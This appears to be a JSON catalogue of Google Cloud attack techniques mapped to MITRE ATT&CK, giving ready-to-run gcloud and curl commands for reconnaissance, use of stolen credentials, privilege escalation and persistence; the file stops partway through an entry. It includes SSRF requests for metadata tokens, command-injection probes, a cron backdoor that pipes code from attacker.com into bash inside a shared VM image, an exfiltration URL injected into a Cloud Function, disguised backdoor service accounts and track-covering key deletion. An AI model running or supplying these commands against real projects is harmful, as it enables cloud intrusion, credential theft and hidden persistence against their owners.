{
  "infrastructure": "gcp",
  "name": "GCP Cloud Attack Techniques",
  "version": "1.0.0",
  "techniques": [
    {
      "id": "GCP-RECON-001",
      "mitre_id": "T1580",
      "name": "GCP Project Enumeration",
      "phase": "reconnaissance",
      "infrastructure": "gcp",
      "description": "Enumerate GCP projects, services, and resources using authenticated access",
      "prerequisites": ["Valid GCP credentials or service account"],
      "tools": ["gcloud CLI", "ScoutSuite", "GCP-IAM-Privesc"],
      "detection": "Cloud Audit Logs for resourcemanager API calls",
      "references": ["https://attack.mitre.org/techniques/T1580/"],
      "next_techniques": ["GCP-RECON-002", "GCP-PRIVESC-001"],
      "risk_level": "low",
      "commands": [
        "# List all accessible GCP projects",
        "gcloud projects list",
        "# Get detailed information about the current project",
        "gcloud projects describe $(gcloud config get-value project)",
        "# List all enabled APIs/services in the project",
        "gcloud services list --enabled",
        "# List all available APIs that can be enabled",
        "gcloud services list --available",
        "# Get organization information (requires org viewer)",
        "gcloud organizations list",
        "# List folders in the organization",
        "gcloud resource-manager folders list --organization=<ORG_ID>",
        "# Get project IAM policy to understand access controls",
        "gcloud projects get-iam-policy $(gcloud config get-value project)",
        "# List billing accounts (financial reconnaissance)",
        "gcloud beta billing accounts list",
        "# Get project metadata including labels and settings",
        "gcloud compute project-info describe",
        "# List all regions where resources can be deployed",
        "gcloud compute regions list",
        "# List all zones available",
        "gcloud compute zones list"
      ]
    },
    {
      "id": "GCP-RECON-002",
      "mitre_id": "T1087.004",
      "name": "IAM User and Service Account Enumeration",
      "phase": "reconnaissance",
      "infrastructure": "gcp",
      "description": "Enumerate IAM users, service accounts, and role bindings to identify privilege escalation paths",
      "prerequisites": ["IAM viewer permissions"],
      "tools": ["gcloud CLI", "GCP-IAM-Privesc", "ScoutSuite"],
      "detection": "Cloud Audit Logs for IAM list operations",
      "references": ["https://attack.mitre.org/techniques/T1087/004/"],
      "next_techniques": ["GCP-PRIVESC-001", "GCP-CRED-001"],
      "risk_level": "low",
      "commands": [
        "# List all service accounts in the project",
        "gcloud iam service-accounts list",
        "# Get detailed info about a specific service account",
        "gcloud iam service-accounts describe <SA_EMAIL>",
        "# List all keys for a service account",
        "gcloud iam service-accounts keys list --iam-account=<SA_EMAIL>",
        "# Get the IAM policy for a service account (who can use it)",
        "gcloud iam service-accounts get-iam-policy <SA_EMAIL>",
        "# Get project-level IAM policy bindings",
        "gcloud projects get-iam-policy $(gcloud config get-value project)",
        "# List all custom IAM roles in the project",
        "gcloud iam roles list --project=$(gcloud config get-value project)",
        "# Get permissions for a specific role",
        "gcloud iam roles describe roles/editor",
        "# List custom roles at organization level",
        "gcloud iam roles list --organization=<ORG_ID>",
        "# Check what roles are granted to a specific member",
        "gcloud projects get-iam-policy $(gcloud config get-value project) --flatten='bindings[].members' --filter='bindings.members:<USER_EMAIL>'",
        "# List workload identity pools for federated access",
        "gcloud iam workload-identity-pools list --location=global",
        "# Enumerate service account impersonation permissions",
        "gcloud iam service-accounts get-iam-policy <SA_EMAIL> --format=json | jq '.bindings[] | select(.role | contains(\"Token\"))'",
        "# Test current identity and permissions",
        "gcloud auth list",
        "# Get access token for current account",
        "gcloud auth print-access-token"
      ]
    },
    {
      "id": "GCP-RECON-003",
      "mitre_id": "T1526",
      "name": "GCS Bucket Enumeration",
      "phase": "reconnaissance",
      "infrastructure": "gcp",
      "description": "Discover and enumerate GCS buckets for public access or misconfigurations",
      "prerequisites": ["Target organization name"],
      "tools": ["GCPBucketBrute", "gcloud CLI", "Custom scripts"],
      "detection": "Cloud Audit Logs for storage API calls",
      "references": ["https://attack.mitre.org/techniques/T1526/"],
      "next_techniques": ["GCP-COLL-001"],
      "risk_level": "low",
      "commands": [
        "# List all GCS buckets in the project",
        "gsutil ls",
        "# List buckets with detailed info",
        "gcloud storage buckets list",
        "# Get bucket metadata including IAM and settings",
        "gsutil ls -L -b gs://<BUCKET_NAME>",
        "# Check bucket IAM policy for public access",
        "gsutil iam get gs://<BUCKET_NAME>",
        "# List bucket contents recursively",
        "gsutil ls -r gs://<BUCKET_NAME>",
        "# Check if bucket allows public access (allUsers or allAuthenticatedUsers)",
        "gsutil iam get gs://<BUCKET_NAME> | grep -E 'allUsers|allAuthenticatedUsers'",
        "# Test anonymous access to a bucket",
        "curl -s https://storage.googleapis.com/<BUCKET_NAME>",
        "# Get bucket versioning status",
        "gsutil versioning get gs://<BUCKET_NAME>",
        "# Check bucket logging configuration",
        "gsutil logging get gs://<BUCKET_NAME>",
        "# List bucket lifecycle rules",
        "gsutil lifecycle get gs://<BUCKET_NAME>",
        "# Brute force common bucket names (using GCPBucketBrute or similar)",
        "# python3 gcpbucketbrute.py -k <keyword> -w wordlist.txt",
        "# Check bucket CORS configuration",
        "gsutil cors get gs://<BUCKET_NAME>",
        "# Get bucket retention policy",
        "gsutil retention get gs://<BUCKET_NAME>"
      ]
    },
    {
      "id": "GCP-INIT-001",
      "mitre_id": "T1078.004",
      "name": "Compromised GCP Credentials",
      "phase": "initial_access",
      "infrastructure": "gcp",
      "description": "Use stolen service account keys or user credentials from leaks or phishing",
      "prerequisites": ["Leaked credentials or keys"],
      "tools": ["gcloud CLI", "Trufflehog", "git-secrets"],
      "detection": "Cloud Audit Logs, unusual authentication patterns",
      "references": ["https://attack.mitre.org/techniques/T1078/004/"],
      "next_techniques": ["GCP-RECON-001", "GCP-EXEC-001"],
      "risk_level": "high",
      "commands": [
        "# Authenticate with a stolen service account key file",
        "gcloud auth activate-service-account --key-file=<KEY_FILE.json>",
        "# Set the project for the authenticated account",
        "gcloud config set project <PROJECT_ID>",
        "# Verify the authenticated identity",
        "gcloud auth list",
        "# Test access by listing resources",
        "gcloud compute instances list",
        "# Search for leaked credentials in git repos using trufflehog",
        "trufflehog git https://github.com/<REPO> --json",
        "# Search for GCP keys in files",
        "grep -r 'GOOG' . --include='*.json'",
        "# Look for service account keys in common locations",
        "find / -name '*.json' -exec grep -l 'private_key' {} \\; 2>/dev/null",
        "# Check environment for GCP credentials",
        "env | grep -i google",
        "# Look for application default credentials",
        "cat ~/.config/gcloud/application_default_credentials.json",
        "# Check gcloud configurations",
        "gcloud config configurations list",
        "# Use access token directly for API calls",
        "curl -H \"Authorization: Bearer <ACCESS_TOKEN>\" https://cloudresourcemanager.googleapis.com/v1/projects",
        "# Decode and inspect a JWT access token",
        "echo '<ACCESS_TOKEN>' | cut -d'.' -f2 | base64 -d 2>/dev/null | jq",
        "# Authenticate using OAuth refresh token",
        "gcloud auth login --cred-file=<CRED_FILE>"
      ]
    },
    {
      "id": "GCP-INIT-002",
      "mitre_id": "T1190",
      "name": "Exploit Public GCP Application",
      "phase": "initial_access",
      "infrastructure": "gcp",
      "description": "Exploit vulnerabilities in applications running on Compute Engine, Cloud Run, or App Engine",
      "prerequisites": ["Vulnerable application endpoint"],
      "tools": ["Burp Suite", "Custom exploits"],
      "detection": "Cloud Armor logs, application logs",
      "references": ["https://attack.mitre.org/techniques/T1190/"],
      "next_techniques": ["GCP-CRED-001", "GCP-EXEC-002"],
      "risk_level": "high",
      "commands": [
        "# Enumerate App Engine services",
        "gcloud app services list",
        "# List Cloud Run services (potential targets)",
        "gcloud run services list",
        "# Get Cloud Run service URL",
        "gcloud run services describe <SERVICE_NAME> --format='value(status.url)'",
        "# List Compute Engine instances with external IPs",
        "gcloud compute instances list --filter='networkInterfaces.accessConfigs.natIP:*'",
        "# Test for SSRF to metadata endpoint from vulnerable app",
        "curl -H 'Metadata-Flavor: Google' 'http://TARGET/vuln?url=http://169.254.169.254/computeMetadata/v1/'",
        "# Test for SSRF to get service account token",
        "curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'",
        "# Enumerate Cloud Functions HTTP triggers",
        "gcloud functions list --format='table(name,httpsTrigger.url)'",
        "# Test Cloud Function for injection vulnerabilities",
        "curl -X POST 'https://REGION-PROJECT.cloudfunctions.net/FUNCTION' -d '{\"input\": \"test\"}'",
        "# Check for exposed Cloud SQL instances",
        "gcloud sql instances list --filter='settings.ipConfiguration.authorizedNetworks.value:0.0.0.0/0'",
        "# Test for command injection in web apps",
        "curl 'http://TARGET/api?cmd=;id'",
        "# Check App Engine versions for older vulnerable deployments",
        "gcloud app versions list"
      ]
    },
    {
      "id": "GCP-INIT-003",
      "mitre_id": "T1199",
      "name": "Workload Identity Federation Abuse",
      "phase": "initial_access",
      "infrastructure": "gcp",
      "description": "Abuse workload identity federation to obtain GCP access from external IdPs",
      "prerequisites": ["Access to trusted external identity provider"],
      "tools": ["gcloud CLI", "Custom scripts"],
      "detection": "Cloud Audit Logs, STS token exchanges",
      "references": ["https://attack.mitre.org/techniques/T1199/"],
      "next_techniques": ["GCP-PRIVESC-001"],
      "risk_level": "high",
      "commands": [
        "# List workload identity pools",
        "gcloud iam workload-identity-pools list --location=global",
        "# Describe a workload identity pool",
        "gcloud iam workload-identity-pools describe <POOL_ID> --location=global",
        "# List providers in a workload identity pool",
        "gcloud iam workload-identity-pools providers list --workload-identity-pool=<POOL_ID> --location=global",
        "# Describe a specific provider configuration",
        "gcloud iam workload-identity-pools providers describe <PROVIDER_ID> --workload-identity-pool=<POOL_ID> --location=global",
        "# Exchange external token for GCP access token using STS",
        "curl -X POST 'https://sts.googleapis.com/v1/token' -H 'Content-Type: application/json' -d '{\"grant_type\": \"urn:ietf:params:oauth:grant-type:token-exchange\", \"audience\": \"//iam.googleapis.com/projects/<PROJECT_NUM>/locations/global/workloadIdentityPools/<POOL_ID>/providers/<PROVIDER_ID>\", \"subject_token_type\": \"urn:ietf:params:oauth:token-type:jwt\", \"requested_token_type\": \"urn:ietf:params:oauth:token-type:access_token\", \"subject_token\": \"<EXTERNAL_TOKEN>\", \"scope\": \"https://www.googleapis.com/auth/cloud-platform\"}'",
        "# Use federated token to impersonate service account",
        "curl -X POST 'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<SA_EMAIL>:generateAccessToken' -H 'Authorization: Bearer <FEDERATED_TOKEN>' -H 'Content-Type: application/json' -d '{\"scope\": [\"https://www.googleapis.com/auth/cloud-platform\"]}'",
        "# Check service account bindings for workload identity",
        "gcloud iam service-accounts get-iam-policy <SA_EMAIL> --format=json | jq '.bindings[] | select(.role==\"roles/iam.workloadIdentityUser\")'",
        "# Generate AWS credentials if AWS provider is configured",
        "# aws sts assume-role-with-web-identity --role-arn <ARN> --web-identity-token <TOKEN>",
        "# Test GitHub Actions OIDC federation",
        "# curl -H \"Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN\" \"$ACTIONS_ID_TOKEN_REQUEST_URL&audience=//iam.googleapis.com/projects/<PROJECT_NUM>/locations/global/workloadIdentityPools/<POOL>/providers/<PROVIDER>\""
      ]
    },
    {
      "id": "GCP-EXEC-001",
      "mitre_id": "T1059",
      "name": "gcloud CLI Execution",
      "phase": "execution",
      "infrastructure": "gcp",
      "description": "Execute gcloud CLI commands using compromised credentials for resource manipulation",
      "prerequisites": ["Valid GCP credentials"],
      "tools": ["gcloud CLI", "Python GCP libraries"],
      "detection": "Cloud Audit Logs for API calls",
      "references": ["https://attack.mitre.org/techniques/T1059/"],
      "next_techniques": ["GCP-PERSIST-001", "GCP-PRIVESC-001"],
      "risk_level": "medium",
      "commands": [
        "# Execute command on a Compute instance using startup script",
        "gcloud compute instances add-metadata <INSTANCE_NAME> --zone=<ZONE> --metadata=startup-script='#!/bin/bash\\nwhoami > /tmp/pwned'",
        "# Reset instance to trigger startup script execution",
        "gcloud compute instances reset <INSTANCE_NAME> --zone=<ZONE>",
        "# Use serial console for command execution",
        "gcloud compute connect-to-serial-port <INSTANCE_NAME> --zone=<ZONE>",
        "# Run command via Cloud Shell (if browser access)",
        "gcloud cloud-shell ssh --command='id'",
        "# Execute using Python GCP libraries",
        "python3 -c \"from google.cloud import compute_v1; client = compute_v1.InstancesClient(); print(list(client.list(project='<PROJECT>', zone='<ZONE>')))\"",
        "# Deploy a Cloud Function with malicious code",
        "gcloud functions deploy malicious-func --runtime=python39 --trigger-http --entry-point=handler --source=./malicious_code/",
        "# Create a Cloud Run job for execution",
        "gcloud run jobs create malicious-job --image=<IMAGE> --command='sh,-c,whoami'",
        "# Execute Cloud Run job",
        "gcloud run jobs execute malicious-job",
        "# Use Cloud Build for code execution",
        "gcloud builds submit --config=cloudbuild.yaml",
        "# Run commands using gcloud compute ssh",
        "gcloud compute ssh <INSTANCE_NAME> --zone=<ZONE> --command='id'",
        "# Use gcloud to invoke a Cloud Function",
        "gcloud functions call <FUNCTION_NAME> --data='{\"command\":\"id\"}'"
      ]
    },
    {
      "id": "GCP-EXEC-002",
      "mitre_id": "T1059",
      "name": "Compute Instance OS Login",
      "phase": "execution",
      "infrastructure": "gcp",
      "description": "Use OS Login to access Compute Engine instances with IAM-based authentication",
      "prerequisites": ["roles/compute.osLogin or osAdminLogin"],
      "tools": ["gcloud compute ssh", "OS Login API"],
      "detection": "Cloud Audit Logs, OS Login audit logs",
      "references": ["https://attack.mitre.org/techniques/T1059/"],
      "next_techniques": ["GCP-CRED-001", "GCP-LATERAL-001"],
      "risk_level": "medium",
      "commands": [
        "# Check if OS Login is enabled on an instance",
        "gcloud compute instances describe <INSTANCE_NAME> --zone=<ZONE> --format='value(metadata.items[enable-oslogin])'",
        "# SSH to instance using OS Login",
        "gcloud compute ssh <INSTANCE_NAME> --zone=<ZONE>",
        "# SSH with specific OS Login user",
        "gcloud compute ssh <USER>@<INSTANCE_NAME> --zone=<ZONE>",
        "# Add SSH key to OS Login profile",
        "gcloud compute os-login ssh-keys add --key-file=~/.ssh/id_rsa.pub",
        "# List SSH keys in OS Login profile",
        "gcloud compute os-login ssh-keys list",
        "# Get OS Login profile",
        "gcloud compute os-login describe-profile",
        "# Use OS Admin Login for sudo access",
        "gcloud compute ssh <INSTANCE_NAME> --zone=<ZONE> --command='sudo id'",
        "# SSH through IAP tunnel (if IAP is enabled)",
        "gcloud compute ssh <INSTANCE_NAME> --zone=<ZONE> --tunnel-through-iap",
        "# Start IAP tunnel for SSH",
        "gcloud compute start-iap-tunnel <INSTANCE_NAME> 22 --local-host-port=localhost:2222 --zone=<ZONE>",
        "# SSH using the IAP tunnel",
        "ssh -p 2222 localhost",
        "# Check IAP permissions",
        "gcloud compute instances get-iam-policy <INSTANCE_NAME> --zone=<ZONE>",
        "# Remove OS Login key (cleanup)",
        "gcloud compute os-login ssh-keys remove --key='<KEY_FINGERPRINT>'"
      ]
    },
    {
      "id": "GCP-EXEC-003",
      "mitre_id": "T1648",
      "name": "Cloud Function Code Injection",
      "phase": "execution",
      "infrastructure": "gcp",
      "description": "Modify Cloud Function code to execute malicious payloads",
      "prerequisites": ["Cloud Functions Developer role"],
      "tools": ["gcloud CLI", "Custom scripts"],
      "detection": "Cloud Audit Logs, function deployment events",
      "references": ["https://attack.mitre.org/techniques/T1648/"],
      "next_techniques": ["GCP-PERSIST-002", "GCP-CRED-002"],
      "risk_level": "high",
      "commands": [
        "# List all Cloud Functions",
        "gcloud functions list",
        "# Describe a specific function to get configuration",
        "gcloud functions describe <FUNCTION_NAME> --region=<REGION>",
        "# Download existing function source code",
        "gcloud functions download <FUNCTION_NAME> --region=<REGION> --destination=./function_source/",
        "# Get function source URL",
        "gcloud functions describe <FUNCTION_NAME> --region=<REGION> --format='value(sourceArchiveUrl)'",
        "# Deploy modified function with malicious code",
        "gcloud functions deploy <FUNCTION_NAME> --region=<REGION> --source=./modified_source/ --runtime=python39 --trigger-http",
        "# Update function environment variables to inject secrets",
        "gcloud functions deploy <FUNCTION_NAME> --region=<REGION> --set-env-vars=EXFIL_URL=https://attacker.com/collect",
        "# Update function to use different service account",
        "gcloud functions deploy <FUNCTION_NAME> --region=<REGION> --service-account=<SA_EMAIL>",
        "# Set function VPC connector for internal access",
        "gcloud functions deploy <FUNCTION_NAME> --region=<REGION> --vpc-connector=<CONNECTOR_NAME>",
        "# Update function memory/timeout for resource abuse",
        "gcloud functions deploy <FUNCTION_NAME> --region=<REGION> --memory=8192MB --timeout=540s",
        "# Invoke the modified function",
        "gcloud functions call <FUNCTION_NAME> --region=<REGION> --data='{}'",
        "# Check function logs for execution results",
        "gcloud functions logs read <FUNCTION_NAME> --region=<REGION>",
        "# Deploy Gen2 function with Cloud Run backend",
        "gcloud functions deploy <FUNCTION_NAME> --gen2 --region=<REGION> --runtime=python39 --trigger-http --source=./"
      ]
    },
    {
      "id": "GCP-PERSIST-001",
      "mitre_id": "T1098.001",
      "name": "Service Account Key Creation",
      "phase": "persistence",
      "infrastructure": "gcp",
      "description": "Create additional service account keys for persistent access",
      "prerequisites": ["Service Account Key Admin role"],
      "tools": ["gcloud CLI"],
      "detection": "Cloud Audit Logs, key creation events",
      "references": ["https://attack.mitre.org/techniques/T1098/001/"],
      "next_techniques": ["GCP-EXEC-001"],
      "risk_level": "high",
      "commands": [
        "# List existing service accounts",
        "gcloud iam service-accounts list",
        "# List existing keys for a service account",
        "gcloud iam service-accounts keys list --iam-account=<SA_EMAIL>",
        "# Create a new key for a service account (persistence)",
        "gcloud iam service-accounts keys create key.json --iam-account=<SA_EMAIL>",
        "# Activate the new key",
        "gcloud auth activate-service-account --key-file=key.json",
        "# Create key with custom validity (if supported)",
        "gcloud iam service-accounts keys create key.json --iam-account=<SA_EMAIL> --key-file-type=json",
        "# Upload a user-managed key (p12 format)",
        "gcloud iam service-accounts keys upload public_key.pem --iam-account=<SA_EMAIL>",
        "# Check key creation date and type",
        "gcloud iam service-accounts keys list --iam-account=<SA_EMAIL> --format='table(name,validAfterTime,validBeforeTime,keyType)'",
        "# Create key for default compute service account",
        "gcloud iam service-accounts keys create key.json --iam-account=$(gcloud iam service-accounts list --filter='displayName:Compute Engine default' --format='value(email)')",
        "# Test the new key works",
        "gcloud auth activate-service-account --key-file=key.json && gcloud projects list",
        "# Exfiltrate the key (base64 encode for transfer)",
        "base64 key.json",
        "# Delete key to cover tracks (optional)",
        "gcloud iam service-accounts keys delete <KEY_ID> --iam-account=<SA_EMAIL>"
      ]
    },
    {
      "id": "GCP-PERSIST-002",
      "mitre_id": "T1098",
      "name": "Cloud Function Backdoor",
      "phase": "persistence",
      "infrastructure": "gcp",
      "description": "Create or modify Cloud Functions with scheduled triggers for persistent callback",
      "prerequisites": ["Cloud Functions Developer role"],
      "tools": ["gcloud CLI", "Custom function code"],
      "detection": "Cloud Audit Logs, function deployment events",
      "references": ["https://attack.mitre.org/techniques/T1098/"],
      "next_techniques": ["GCP-CRED-002"],
      "risk_level": "high",
      "commands": [
        "# Create a Cloud Scheduler job to trigger function periodically",
        "gcloud scheduler jobs create http backdoor-trigger --schedule='*/5 * * * *' --uri='https://REGION-PROJECT.cloudfunctions.net/FUNCTION' --http-method=POST",
        "# Deploy a backdoor function with HTTP trigger",
        "gcloud functions deploy backdoor-func --runtime=python39 --trigger-http --entry-point=handler --source=./backdoor_code/ --allow-unauthenticated",
        "# Deploy function triggered by Pub/Sub (stealthier)",
        "gcloud functions deploy backdoor-pubsub --runtime=python39 --trigger-topic=<TOPIC_NAME> --entry-point=handler --source=./backdoor_code/",
        "# Create Pub/Sub topic for triggering",
        "gcloud pubsub topics create backdoor-topic",
        "# Deploy function triggered by Cloud Storage events",
        "gcloud functions deploy backdoor-storage --runtime=python39 --trigger-bucket=<BUCKET_NAME> --entry-point=handler --source=./backdoor_code/",
        "# List Cloud Scheduler jobs",
        "gcloud scheduler jobs list",
        "# Update scheduler job schedule",
        "gcloud scheduler jobs update http backdoor-trigger --schedule='0 */6 * * *'",
        "# Pause scheduler job (to avoid detection temporarily)",
        "gcloud scheduler jobs pause backdoor-trigger",
        "# Resume scheduler job",
        "gcloud scheduler jobs resume backdoor-trigger",
        "# Check function invocation logs",
        "gcloud functions logs read backdoor-func --limit=50",
        "# Deploy function with VPC access for internal recon",
        "gcloud functions deploy backdoor-internal --runtime=python39 --trigger-http --vpc-connector=<CONNECTOR> --source=./backdoor_code/"
      ]
    },
    {
      "id": "GCP-PERSIST-003",
      "mitre_id": "T1136.003",
      "name": "Service Account Creation",
      "phase": "persistence",
      "infrastructure": "gcp",
      "description": "Create new service accounts for persistent access",
      "prerequisites": ["Service Account Admin role"],
      "tools": ["gcloud CLI"],
      "detection": "Cloud Audit Logs, service account creation events",
      "references": ["https://attack.mitre.org/techniques/T1136/003/"],
      "next_techniques": ["GCP-PRIVESC-001"],
      "risk_level": "high",
      "commands": [
        "# Create a new service account for persistence",
        "gcloud iam service-accounts create backdoor-sa --display-name='Backup Service Account'",
        "# Get the email of the created service account",
        "gcloud iam service-accounts list --filter='displayName:Backup Service Account' --format='value(email)'",
        "# Grant project-level roles to the new service account",
        "gcloud projects add-iam-policy-binding $(gcloud config get-value project) --member='serviceAccount:<SA_EMAIL>' --role='roles/editor'",
        "# Grant owner role for full access (high risk)",
        "gcloud projects add-iam-policy-binding $(gcloud config get-value project) --member='serviceAccount:<SA_EMAIL>' --role='roles/owner'",
        "# Create key for the new service account",
        "gcloud iam service-accounts keys create backdoor-key.json --iam-account=<SA_EMAIL>",
        "# Grant service account user role (allows impersonation)",
        "gcloud iam service-accounts add-iam-policy-binding <SA_EMAIL> --member='user:<ATTACKER_EMAIL>' --role='roles/iam.serviceAccountUser'",
        "# Grant token creator role (allows generating access tokens)",
        "gcloud iam service-accounts add-iam-policy-binding <SA_EMAIL> --member='user:<ATTACKER_EMAIL>' --role='roles/iam.serviceAccountTokenCreator'",
        "# Create service account with innocuous name to blend in",
        "gcloud iam service-accounts create gcp-monitoring-agent --display-name='GCP Monitoring Agent'",
        "# Grant Storage Admin for data access",
        "gcloud projects add-iam-policy-binding $(gcloud config get-value project) --member='serviceAccount:<SA_EMAIL>' --role='roles/storage.admin'",
        "# Grant Compute Admin for instance control",
        "gcloud projects add-iam-policy-binding $(gcloud config get-value project) --member='serviceAccount:<SA_EMAIL>' --role='roles/compute.admin'",
        "# Verify the service account has expected permissions",
        "gcloud projects get-iam-policy $(gcloud config get-value project) --flatten='bindings[].members' --filter='bindings.members:serviceAccount:<SA_EMAIL>'"
      ]
    },
    {
      "id": "GCP-PERSIST-004",
      "mitre_id": "T1525",
      "name": "Backdoored VM Image",
      "phase": "persistence",
      "infrastructure": "gcp",
      "description": "Create VM image with backdoor and share or use in target projects",
      "prerequisites": ["Compute Image User role"],
      "tools": ["gcloud CLI", "Custom scripts"],
      "detection": "Cloud Audit Logs, image creation events",
      "references": ["https://attack.mitre.org/techniques/T1525/"],
      "next_techniques": ["GCP-LATERAL-001"],
      "risk_level": "high",
      "commands": [
        "# List existing images in the project",
        "gcloud compute images list --no-standard-images",
        "# Create an instance to prepare backdoored image",
        "gcloud compute instances create backdoor-builder --zone=<ZONE> --image-family=debian-11 --image-project=debian-cloud",
        "# SSH to instance and install backdoor",
        "gcloud compute ssh backdoor-builder --zone=<ZONE> --command='echo \"* * * * * curl http://attacker.com/c2 | bash\" | crontab -'",
        "# Stop the instance before creating image",
        "gcloud compute instances stop backdoor-builder --zone=<ZONE>",
        "# Create image from the backdoored instance",
        "gcloud compute images create backdoored-image --source-disk=backdoor-builder --source-disk-zone=<ZONE>",
        "# Delete the builder instance",
        "gcloud compute instances delete backdoor-builder --zone=<ZONE>",
        "# Share the image with other projects",
        "gcloud compute images add-iam-policy-binding backdoored-image --member='projectEditor:<TARGET_PROJECT>' --role='roles/compute.imageUser'",
        "# Make image public (dangerous but effective)",
        "gcloud compute images add-iam-policy-binding backdoored-image --member='allAuthenticatedUsers' --role='roles/compute.imageUser'",
        "# Create image family for auto-selection",
        "gcloud compute images create backdoored-image-v2 --source-disk=<DISK> --source-disk-zone=<ZONE> --family=corporate-base",
        "# Deprecate old images to force use of backdoored one",
        "gcloud compute images deprecate old-image --state=DEPRECATED --replacement=backdoored-image",
        "# Create instance using backdoored image",
        "gcloud compute instances create victim-instance --zone=<ZONE> --image=backdoored-image",
        "# Export image to GCS for external sharing",
        "gcloud compute images export --destination-uri=gs://<BUCKET>/backdoored-image.tar.gz --image=backdoored-image"
      ]
    },
    {
      "id": "GCP-PRIVESC-001",
      "mitre_id": "T1548",
      "name": "IAM Policy Privilege Escalation",
      "phase": "privilege_escalation",
      "infrastructure": "gcp",
      "description": "Exploit overly permissive IAM policies to escalate privileges",
      "prerequisites": ["Specific IAM permissions (setIamPolicy, actAs, etc.)"],
      "tools": ["GCP-IAM-Privesc", "gcloud CLI"],
      "detection": "Cloud Audit Logs, IAM policy changes",
      "references": ["https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/"],
      "next_techniques": ["GCP-PERSIST-001", "GCP-CRED-002"],
      "risk_level": "critical",
      "commands": [
        "# Check current permissions (useful for identifying privesc paths)",
        "gcloud projects get-iam-policy $(gcloud config get-value project) --flatten='bindings[].members' --filter='bindings.members:$(gcloud config get-value account)'",
        "# If you have setIamPolicy, grant yourself Owner role",
        "gcloud projects add-iam-policy-binding $(gcloud config get-value project) --member='user:<YOUR_EMAIL>' --role='roles/owner'",
        "# If you have iam.serviceAccountUser, attach high-priv SA to compute",
        "gcloud compute instances set-service-account <INSTANCE_NAME> --zone=<ZONE> --service-account=<HIGH_PRIV_SA_EMAIL>",
        "# If you can create service account keys, create key for privileged SA",
        "gcloud iam service-accounts keys create privesc-key.json --iam-account=<HIGH_PRIV_SA_EMAIL>",
        "# Use deploymentmanager.deployments.create for privilege escalation",
        "gcloud deployment-manager deployments create privesc --config=deployment.yaml",
        "# Exploit cloudfunctions.functions.create with actAs permission",
        "gcloud functions deploy privesc-func --runtime=python39 --trigger-http --service-account=<HIGH_PRIV_SA_EMAIL> --source=./code/",
        "# Exploit compute.instances.create with actAs permission",
        "gcloud compute instances create privesc-instance --zone=<ZONE> --service-account=<HIGH_PRIV_SA_EMAIL> --scopes=cloud-platform",
        "# Use run.services.create for privesc via Cloud Run",
        "gcloud run deploy privesc-service --image=<IMAGE> --service-account=<HIGH_PRIV_SA_EMAIL>",
        "# Exploit cloudbuild.builds.create (Cloud Build default SA is highly privileged)",
        "gcloud builds submit --config=cloudbuild.yaml",
        "# Use composer.environments.create for Airflow-based privesc",
        "gcloud composer environments create privesc-env --location=<REGION> --service-account=<HIGH_PRIV_SA_EMAIL>",
        "# Check for custom role with escalation permissions",
        "gcloud iam roles describe <ROLE_NAME> --project=$(gcloud config get-value project)",
        "# Run GCP IAM Privilege Escalation scanner",
        "# python3 gcp_iam_privesc.py -p <PROJECT_ID>"
      ]
    },
    {
      "id": "GCP-PRIVESC-002",
      "mitre_id": "T1548",
      "name": "Service Account Impersonation",
      "phase": "privilege_escalation",
      "infrastructure": "gcp",
      "description": "Impersonate high-privilege service accounts using iam.serviceAccountTokenCreator",
      "prerequisites": ["Service Account Token Creator role"],
      "tools": ["gcloud CLI", "Python GCP libraries"],
      "detection": "Cloud Audit Logs, token generation events",
      "references": ["https://attack.mitre.org/techniques/T1548/"],
      "next_techniques": ["GCP-EXEC-001", "GCP-CRED-002"],
      "risk_level": "critical",
      "commands": [
        "# Check if you can impersonate a service account",
        "gcloud iam service-accounts get-iam-policy <TARGET_SA_EMAIL> --format=json | jq '.bindings[] | select(.role | contains(\"TokenCreator\"))'",
        "# Impersonate a service account for gcloud commands",
        "gcloud config set auth/impersonate_service_account <TARGET_SA_EMAIL>",
        "# Run command as impersonated service account",
        "gcloud compute instances list --impersonate-service-account=<TARGET_SA_EMAIL>",
        "# Generate access token for a service account",
        "gcloud auth print-access-token --impersonate-service-account=<TARGET_SA_EMAIL>",
        "# Generate ID token for a service account",
        "gcloud auth print-identity-token --impersonate-service-account=<TARGET_SA_EMAIL> --audiences=<AUDIENCE>",
        "# Use REST API to generate access token",
        "curl -X POST -H \"Authorization: Bearer $(gcloud auth print-access-token)\" -H \"Content-Type: application/json\" \"https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<TARGET_SA_EMAIL>:generateAccessToken\" -d '{\"scope\": [\"https://www.googleapis.com/auth/cloud-platform\"]}'",
        "# Sign a blob as the service account",
        "gcloud iam service-accounts sign-blob input.txt output.sig --iam-account=<TARGET_SA_EMAIL>",
        "# Sign a JWT as the service account",
        "gcloud iam service-accounts sign-jwt jwt-input.json signed-jwt.txt --iam-account=<TARGET_SA_EMAIL>",
        "# Chain impersonation (if allowed)",
        "gcloud auth print-access-token --impersonate-service-account=<SA_1> --impersonate-service-account=<SA_2>",
        "# List service accounts you can impersonate",
        "gcloud iam service-accounts list --format='value(email)' | while read sa; do gcloud iam service-accounts get-iam-policy $sa 2>/dev/null | grep -q $(gcloud config get-value account) && echo \"Can impersonate: $sa\"; done",
        "# Disable impersonation when done",
        "gcloud config unset auth/impersonate_service_account"
      ]
    },
    {
      "id": "GCP-PRIVESC-003",
      "mitre_id": "T1078.004",
      "name": "Compute Instance Service Account",
      "phase": "privilege_escalation",
      "infrastructure": "gcp",
      "description": "Create or modify Compute instances to use high-privilege service accounts",
      "prerequisites": ["Compute Instance Admin role", "Service Account User role"],
      "tools": ["gcloud CLI"],
      "detection": "Cloud Audit Logs, instance creation/modification",
      "references": ["https://attack.mitre.org/techniques/T1078/004/"],
      "next_techniques": ["GCP-CRED-001"],
      "risk_level": "critical",
      "commands": [
        "# List service accounts to find high-privilege targets",
        "gcloud iam service-accounts list",
        "# Check service account roles",
        "gcloud projects get-iam-policy $(gcloud config get-value project) --flatten='bindings[].members' --filter='bindings.members:serviceAccount:' --format='table(bindings.role,bindings.members)'",
        "# Create instance with privileged service account",
        "gcloud compute instances create privesc-instance --zone=<ZONE> --service-account=<HIGH_PRIV_SA_EMAIL> --scopes=cloud-platform",
        "# Modify existing instance to use different service account (requires stop)",
        "gcloud compute instances stop <INSTANCE_NAME> --zone=<ZONE>",
